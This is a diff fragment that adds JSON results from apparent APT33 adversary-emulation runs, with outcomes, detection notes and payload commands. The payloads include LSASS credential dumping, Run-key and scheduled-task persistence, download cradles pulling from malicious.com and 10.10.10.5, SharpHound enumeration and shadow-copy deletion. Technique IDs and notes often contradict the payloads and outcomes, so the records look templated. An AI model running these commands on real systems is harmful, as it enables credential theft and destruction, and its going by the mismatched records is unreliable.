+          "payloadCode": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"UpdateTask\" /t REG_SZ /d \"C:\\Temp\\malware.exe\" /f",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50033",
+          "name": "APT33 Simulation - Simulated Execution of T1548.002",
+          "outcome": "Missed",
+          "coverageRating": "None",
+          "severity": "Critical",
+          "ttps": [
+            "T1548.002"
+          ],
+          "execNotes": "Attempted lateral movement via WMI to domain controller. Access denied due to lack of privileges.",
+          "detNotes": "Network traffic to known C2 IP was blocked by Palo Alto firewall. No host-level alert triggered.",
+          "payloadCode": "procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50034",
+          "name": "APT33 Simulation - Simulated Execution of T1005",
+          "outcome": "Missed",
+          "coverageRating": "None",
+          "severity": "High",
+          "ttps": [
+            "T1005"
+          ],
+          "execNotes": "Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.",
+          "detNotes": "Network traffic to known C2 IP was blocked by Palo Alto firewall. No host-level alert triggered.",
+          "payloadCode": "bitsadmin /transfer myDownloadJob /download /priority normal http://malicious.com/payload.exe C:\\Temp\\payload.exe",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50035",
+          "name": "APT33 Simulation - Simulated Execution of T1090.001",
+          "outcome": "Logged",
+          "coverageRating": "Minimal",
+          "severity": "High",
+          "ttps": [
+            "T1090.001"
+          ],
+          "execNotes": "Modified registry keys to achieve persistence via Run keys. Validated survival after reboot.",
+          "detNotes": "No alert generated in SIEM. Found evidence of execution in Sysmon Event ID 1 during retrospective hunt.",
+          "payloadCode": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 600 C:\\Temp\\lsass.dmp full",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50036",
+          "name": "APT33 Simulation - Simulated Execution of T1082",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1082"
+          ],
+          "execNotes": "Modified registry keys to achieve persistence via Run keys. Validated survival after reboot.",
+          "detNotes": "Alert fired for LSASS memory dump. SOC escalated to Tier 3 for immediate response.",
+          "payloadCode": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 600 C:\\Temp\\lsass.dmp full",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        }
+      ],
+      "timestamp": "2026-05-05T16:38:53.390Z"
+    },
+    "APT33 Simulation (March 2026 Run 2)": {
+      "summary": "## Executive Summary\nThis simulation tested the organization's defenses against APT33 Simulation TTPs. Results were mixed, highlighting key areas for improvement.\n\n## Key Findings\nSeveral critical detection gaps were identified during execution.\n\n## Risk Analysis\nUnmitigated gaps could allow threat actors to establish persistence undetected.\n\n## Recommendations\nImplement stronger network segmentation and enhance EDR logging.",
+      "details": {
+        "name": "APT33 Simulation (March 2026 Run 2)",
+        "environmentCategory": [
+          "Linux",
+          "Windows Server"
+        ],
+        "goals": "Validate defensive posture against APT33 Simulation",
+        "participants": [
+          {
+            "name": "Blue Team",
+            "role": "SOC"
+          },
+          {
+            "name": "Red Team",
+            "role": "Adversary Emulation"
+          }
+        ]
+      },
+      "attackChain": [],
+      "testResults": [
+        {
+          "id": "50037",
+          "name": "APT33 Simulation - Simulated Execution of T1133",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1133"
+          ],
+          "execNotes": "Ran simulated ransomware payload. 500 files encrypted before process crashed.",
+          "detNotes": "CrowdStrike blocked the execution of SharpHound. Generated High severity incident.",
+          "payloadCode": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"UpdateTask\" /t REG_SZ /d \"C:\\Temp\\malware.exe\" /f",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50038",
+          "name": "APT33 Simulation - Simulated Execution of T1543.003",
+          "outcome": "Alerted",
+          "coverageRating": "Partial",
+          "severity": "Low",
+          "ttps": [
+            "T1543.003"
+          ],
+          "execNotes": "Deployed custom Python script to scrape credentials from memory. Execution was successful, memory dump was exfiltrated via DNS.",
+          "detNotes": "Detected registry modification via Carbon Black, but alert was buried under low-fidelity noise.",
+          "payloadCode": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"UpdateTask\" /t REG_SZ /d \"C:\\Temp\\malware.exe\" /f",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50039",
+          "name": "APT33 Simulation - Simulated Execution of T1068",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1068"
+          ],
+          "execNotes": "Ran simulated ransomware payload. 500 files encrypted before process crashed.",
+          "detNotes": "Analyst noted abnormal volume of DNS requests to a newly registered domain. Created custom detection rule.",
+          "payloadCode": "bitsadmin /transfer myDownloadJob /download /priority normal http://malicious.com/payload.exe C:\\Temp\\payload.exe",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50040",
+          "name": "APT33 Simulation - Simulated Execution of T1548.002",
+          "outcome": "Logged",
+          "coverageRating": "Minimal",
+          "severity": "High",
+          "ttps": [
+            "T1548.002"
+          ],
+          "execNotes": "Dumped LSASS memory using procdump.exe. File saved to C:\\Temp\\lsass.dmp.",
+          "detNotes": "Alert fired for LSASS memory dump. SOC escalated to Tier 3 for immediate response.",
+          "payloadCode": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"UpdateTask\" /t REG_SZ /d \"C:\\Temp\\malware.exe\" /f",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50041",
+          "name": "APT33 Simulation - Simulated Execution of T1005",
+          "outcome": "Logged",
+          "coverageRating": "Minimal",
+          "severity": "High",
+          "ttps": [
+            "T1005"
+          ],
+          "execNotes": "Utilized living-off-the-land binaries (certutil.exe) to download the next stage payload.",
+          "detNotes": "EDR alerted on suspicious PowerShell activity. Analyst triaged and isolated host within 15 minutes.",
+          "payloadCode": "powershell.exe -nop -exec bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/payload.ps1')\"",
+          "expectedOutcome": "Prevented",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50042",
+          "name": "APT33 Simulation - Simulated Execution of T1090.001",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1090.001"
+          ],
+          "execNotes": "Injected shellcode into explorer.exe to evade detection. C2 connection established.",
+          "detNotes": "CrowdStrike blocked the execution of SharpHound. Generated High severity incident.",
+          "payloadCode": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 600 C:\\Temp\\lsass.dmp full",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50043",
+          "name": "APT33 Simulation - Simulated Execution of T1082",
+          "outcome": "Alerted",
+          "coverageRating": "Partial",
+          "severity": "Low",
+          "ttps": [
+            "T1082"
+          ],
+          "execNotes": "Modified registry keys to achieve persistence via Run keys. Validated survival after reboot.",
+          "detNotes": "Alert fired for LSASS memory dump. SOC escalated to Tier 3 for immediate response.",
+          "payloadCode": "wmic process call create \"cmd.exe /c calc.exe\"",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        }
+      ],
+      "timestamp": "2026-03-10T18:52:30.500Z"
+    },
+    "APT33 Simulation (April 2026 Run 3)": {
+      "summary": "## Executive Summary\nThis simulation tested the organization's defenses against APT33 Simulation TTPs. Results were mixed, highlighting key areas for improvement.\n\n## Key Findings\nSeveral critical detection gaps were identified during execution.\n\n## Risk Analysis\nUnmitigated gaps could allow threat actors to establish persistence undetected.\n\n## Recommendations\nImplement stronger network segmentation and enhance EDR logging.",
+      "details": {
+        "name": "APT33 Simulation (April 2026 Run 3)",
+        "environmentCategory": [
+          "Linux",
+          "Windows Server"
+        ],
+        "goals": "Validate defensive posture against APT33 Simulation",
+        "participants": [
+          {
+            "name": "Blue Team",
+            "role": "SOC"
+          },
+          {
+            "name": "Red Team",
+            "role": "Adversary Emulation"
+          }
+        ]
+      },
+      "attackChain": [],
+      "testResults": [
+        {
+          "id": "50044",
+          "name": "APT33 Simulation - Simulated Execution of T1133",
+          "outcome": "Logged",
+          "coverageRating": "Minimal",
+          "severity": "Medium",
+          "ttps": [
+            "T1133"
+          ],
+          "execNotes": "Utilized living-off-the-land binaries (certutil.exe) to download the next stage payload.",
+          "detNotes": "No alert generated in SIEM. Found evidence of execution in Sysmon Event ID 1 during retrospective hunt.",
+          "payloadCode": "bitsadmin /transfer myDownloadJob /download /priority normal http://malicious.com/payload.exe C:\\Temp\\payload.exe",
+          "expectedOutcome": "Prevented",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50045",
+          "name": "APT33 Simulation - Simulated Execution of T1543.003",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1543.003"
+          ],
+          "execNotes": "Utilized living-off-the-land binaries (certutil.exe) to download the next stage payload.",
+          "detNotes": "Authentication logs show successful logon from unusual IP. Conditional Access policy did not block it.",
+          "payloadCode": "schtasks /create /tn \"WindowsUpdater\" /tr \"C:\\Temp\\payload.exe\" /sc onlogon /ru System",
+          "expectedOutcome": "Prevented",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50046",
+          "name": "APT33 Simulation - Simulated Execution of T1068",
+          "outcome": "Missed",
+          "coverageRating": "None",
+          "severity": "Critical",
+          "ttps": [
+            "T1068"
+          ],
+          "execNotes": "Attempted lateral movement via WMI to domain controller. Access denied due to lack of privileges.",
+          "detNotes": "Detected registry modification via Carbon Black, but alert was buried under low-fidelity noise.",
+          "payloadCode": "SharpHound.exe -c All -d target.local --domaincontroller 192.168.1.100",
+          "expectedOutcome": "Logged",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50047",
+          "name": "APT33 Simulation - Simulated Execution of T1548.002",
+          "outcome": "Missed",
+          "coverageRating": "None",
+          "severity": "Low",
+          "ttps": [
+            "T1548.002"
+          ],
+          "execNotes": "Attempted to bypass UAC using fodhelper.exe. Command executed as standard user but failed to elevate privileges.",
+          "detNotes": "EDR alerted on suspicious PowerShell activity. Analyst triaged and isolated host within 15 minutes.",
+          "payloadCode": "bitsadmin /transfer myDownloadJob /download /priority normal http://malicious.com/payload.exe C:\\Temp\\payload.exe",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50048",
+          "name": "APT33 Simulation - Simulated Execution of T1005",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1005"
+          ],
+          "execNotes": "Modified registry keys to achieve persistence via Run keys. Validated survival after reboot.",
+          "detNotes": "Detected registry modification via Carbon Black, but alert was buried under low-fidelity noise.",
+          "payloadCode": "wmic process call create \"cmd.exe /c calc.exe\"",
+          "expectedOutcome": "Prevented",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50049",
+          "name": "APT33 Simulation - Simulated Execution of T1090.001",
+          "outcome": "Prevented",
+          "coverageRating": "Optimal",
+          "severity": "N/A",
+          "ttps": [
+            "T1090.001"
+          ],
+          "execNotes": "Attempted lateral movement via WMI to domain controller. Access denied due to lack of privileges.",
+          "detNotes": "CrowdStrike blocked the execution of SharpHound. Generated High severity incident.",
+          "payloadCode": "wmic process call create \"cmd.exe /c calc.exe\"",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        },
+        {
+          "id": "50050",
+          "name": "APT33 Simulation - Simulated Execution of T1082",
+          "outcome": "Alerted",
+          "coverageRating": "Partial",
+          "severity": "Low",
+          "ttps": [
+            "T1082"
+          ],
+          "execNotes": "Executed PowerShell download cradle to pull secondary payload. Payload failed to execute due to execution policy.",
+          "detNotes": "Authentication logs show successful logon from unusual IP. Conditional Access policy did not block it.",
+          "payloadCode": "vssadmin.exe Delete Shadows /All /Quiet",
+          "expectedOutcome": "Alerted",
+          "eventType": "Payload"
+        }
+      ],
+      "timestamp": "2026-04-29T11:19:35.938Z"
+    }
+  },
+  "simulationEvidence": {
+    "APT29 Emulation (January 2026 Run 1)": [],
+    "FIN7 Campaign (February 2026 Run 1)": [],
+    "Scattered Spider Emulation (February 2026 Run 1)": [],
+    "Wizard Spider Ransomware (February 2026 Run 1)": [],
+    "Wizard Spider Ransomware (April 2026 Run 2)": [],
+    "APT33 Simulation (May 2026 Run 1)": [],
+    "APT33 Simulation (March 2026 Run 2)": [],
+    "APT33 Simulation (April 2026 Run 3)": []
+  }
+}
